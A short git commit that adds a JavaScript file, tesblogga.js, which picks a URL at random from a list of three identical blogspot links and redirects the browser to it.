88f60f6ec3ae089ad79252e31d2fdc7cc0c6e77c
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-10-31 13:37:51 +0700

    Create tesblogga.js

---
+++ tesblogga.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://liveinfonew12.blogspot.com/2025/07/blog-post_19.html',
+
+  'https://liveinfonew12.blogspot.com/2025/07/blog-post_19.html',
+
+  'https://liveinfonew12.blogspot.com/2025/07/blog-post_19.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
